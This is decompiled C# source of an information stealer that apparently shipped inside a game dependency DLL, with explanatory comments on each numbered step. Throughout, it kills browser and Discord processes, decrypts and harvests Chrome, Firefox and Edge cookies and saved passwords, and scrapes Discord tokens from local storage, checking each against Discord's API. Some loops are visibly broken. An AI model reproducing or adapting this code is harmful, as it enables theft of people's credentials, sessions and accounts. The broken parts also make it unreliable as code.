// Decompiled with JetBrains decompiler
// Type: MegaGigaPowerfulStealer.Stealer
// Assembly: GameDep, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0FAA85E1-7395-44B4-AB8C-F4AF88642E49
// Assembly location: C:\Users\burne\Desktop\dope planes and cars game\GameDep.dll

using CockyGrabber;
using CockyGrabber.Classes;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text.RegularExpressions;

namespace MegaGigaPowerfulStealer
{
    internal class Stealer
    {
        /// <summary>
        /// #13
        /// Kills the browser proccess if active and steals the user's or users' cookies using CockyStealer depending on if there are multiple profiles or not.
        /// </summary>
        /// <returns></returns>
        public static string GetCookies()
        {
            string str = "";
            try
            {
                foreach (Process process in Process.GetProcessesByName("chrome"))
                    process.Kill();
                foreach (string directory in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data"))
                {
                    if (directory.EndsWith("\\Default") || directory.Contains("Profile"))
                    {
                        ChromeGrabber chromeGrabber = new ChromeGrabber();
                        chromeGrabber.ChromeCookiePath = directory + "\\Cookies";
                        foreach (CockyGrabber.Classes.Cookie allCookie in chromeGrabber.GetAllCookies(chromeGrabber.GetKey()))
                            str = str + allCookie.HostName + "\tTRUE\t/\tTRUE\t2147483648\t" + allCookie.Name + "\t" + allCookie.Value + "\n";
                    }
                }
            }
            catch (Exception ex)
            {
            }
            try
            {
                foreach (Process process in Process.GetProcessesByName("firefox"))
                    process.Kill();
                foreach (CockyGrabber.Classes.Cookie allCookie in new FirefoxGrabber().GetAllCookies())
                    str = str + allCookie.HostName + "\tTRUE\t/\tTRUE\t2147483648\t" + allCookie.Name + "\t" + allCookie.Value + "\n";
            }
            catch (Exception ex)
            {
            }
            try
            {
                foreach (Process process in Process.GetProcessesByName("msedge"))
                    process.Kill();
                EdgeGrabber edgeGrabber = new EdgeGrabber();
                foreach (CockyGrabber.Classes.Cookie allCookie in edgeGrabber.GetAllCookies(edgeGrabber.GetKey()))
                    str = str + allCookie.HostName + "\tTRUE\t/\tTRUE\t2147483648\t" + allCookie.Name + "\t" + allCookie.Value + "\n";
            }
            catch (Exception ex)
            {
            }
            return str;
        }

        /// <summary>
        /// #12
        /// Kills the browser proccess if active and steals the all login data if any is saved.
        /// </summary>
        /// <returns>A collection of website urls with corresponding usernames/emails and passwords</returns>
        public static string GetPasswords()
        {
            string str = "";
            try
            {
                foreach (Process process in Process.GetProcessesByName("chrome"))
                    process.Kill();
                foreach (string directory in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data"))
                {
                    if (directory.EndsWith("\\Default") || directory.Contains("Profile"))
                    {
                        ChromeGrabber chromeGrabber = new ChromeGrabber();
                        chromeGrabber.ChromeCookiePath = directory + "\\Login Data";
                        foreach (Passwords allPassword in chromeGrabber.GetAllPasswords(chromeGrabber.GetKey()))
                            str = str + "URL: " + allPassword.url + "\nLogin:" + allPassword.username + "\nPassword: " + allPassword.password + "\nBrowser: Chrome \n\n";
                    }
                }
            }
            catch (Exception ex)
            {
            }
            try
            {
                foreach (Process process in Process.GetProcessesByName("msedge"))
                    process.Kill();
                EdgeGrabber edgeGrabber = new EdgeGrabber();
                foreach (Passwords allPassword in edgeGrabber.GetAllPasswords(edgeGrabber.GetKey()))
                    str = str + "URL: " + allPassword.url + "\nLogin:" + allPassword.username + "\nPassword: " + allPassword.password + "\nBrowser: Edge \n\n";
            }
            catch (Exception ex)
            {
            }
            return str;
        }

        /// <summary>
        /// #11
        /// Attempts to see if the token works by hitting their API with the stolen token.
        /// </summary>
        /// <param name="token">Discord token</param>
        /// <returns>Returns true if valid, false otherwise.</returns>
        public static bool CheckToken(string token)
        {
            try
            {
                HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://discord.com/api/v9/users/@me");
                httpWebRequest.Headers["Authorization"] = token;
                using (StreamReader streamReader = new StreamReader(httpWebRequest.GetResponse().GetResponseStream()))
                    streamReader.ReadToEnd();
                return true;
            }
            catch (Exception ex)
            {
                return false;
            }
        }

        /// <summary>
        /// #9
        /// Kills the discord client, tries to collect the token from the applications local database and finally tries the same on any installed browser's local database.
        /// </summary>
        /// <returns>A string list of discord tokens</returns>
        public static List<string> GetDiscordPath()
        {
            Stealer.KillDiscords();
            List<string> stringList1 = new List<string>();
            /// Goes into the appdata folder on the user's account and steals the user's tokens if any are found and are found to be working
            foreach (string directory in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)))
            {
                if (directory.Contains("iscord") && Directory.Exists(directory + "\\Local Storage\\leveldb"))
                {
                    foreach (string file in Directory.GetFiles(directory + "\\Local Storage\\leveldb"))
                    {
                        foreach (Match match in new Regex("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}").Matches(System.IO.File.ReadAllText(file)))
                        {
                            if (Stealer.CheckToken(match.Value))
                                stringList1.Add(match.Value);
                        }
                        foreach (Match match in new Regex("mfa\\.[\\w-]{84}").Matches(System.IO.File.ReadAllText(file)))
                        {
                            if (Stealer.CheckToken(match.Value))
                                stringList1.Add(match.Value);
                        }
                    }
                }
            }
            string path1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome";
            List<string> stringList2 = new List<string>();
            string path2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge";
            string path3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera GX Stable";
            /// Checks to see if Chrome, Edge or Opera GX are installed, if they are it'll add each profile directory to stringList2
            if (Directory.Exists(path1))
            {
                foreach (char ch in path1)
                {
                    int num;
                    if (!((IEnumerable<string>)ch.ToString().Split('\\')).Last<string>().Contains("Profile"))
                        num = ((IEnumerable<string>)ch.ToString().Split('\\')).Last<string>() == "Default" ? 1 : 0;
                    else
                        num = 1;
                    if (num != 0)
                        stringList2.Add(ch.ToString());
                }
            }
            if (Directory.Exists(path2))
            {
                foreach (char ch in path2)
                {
                    int num;
                    if (!((IEnumerable<string>)ch.ToString().Split('\\')).Last<string>().Contains("Profile"))
                        num = ((IEnumerable<string>)ch.ToString().Split('\\')).Last<string>() == "Default" ? 1 : 0;
                    else
                        num = 1;
                    if (num != 0)
                        stringList2.Add(ch.ToString());
                }
            }
            if (Directory.Exists(path3))
            {
                foreach (char ch in path3)
                {
                    int num;
                    if (!((IEnumerable<string>)ch.ToString().Split('\\')).Last<string>().Contains("Profile"))
                        num = ((IEnumerable<string>)ch.ToString().Split('\\')).Last<string>() == "Default" ? 1 : 0;
                    else
                        num = 1;
                    if (num != 0)
                        stringList2.Add(ch.ToString());
                }
            }
            /// Loops through the collection of profiles for each web browser and steals the discord token from there if the local database contains it.
            foreach (string str in stringList2)
            {
                foreach (string file in Directory.GetFiles(str + "\\Local Storage\\leveldb"))
                {
                    System.IO.File.Copy(file, Path.GetTempPath() + "\\aaa.ldb");
                    foreach (Match match in Regex.Matches(System.IO.File.ReadAllText(Path.GetTempPath() + "\\aaa.ldb"), "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}"))
                        stringList1.Add(match.Value);
                    foreach (Match match in Regex.Matches(System.IO.File.ReadAllText(Path.GetTempPath() + "\\aaa.ldb"), "mfa\\.[\\w-]{84}"))
                        stringList1.Add(match.Value);
                    System.IO.File.Delete("\\aaa.ldb");
                }
            }
            return stringList1;
        }

        /// <summary>
        /// #10
        /// A very rudimentary way of killing the discord application.
        /// </summary>
        private static void KillDiscords()
        {
            foreach (Process process in Process.GetProcesses())
            {
                if (process.ProcessName.Contains("iscord"))
                    process.Kill();
            }
        }
    }
}
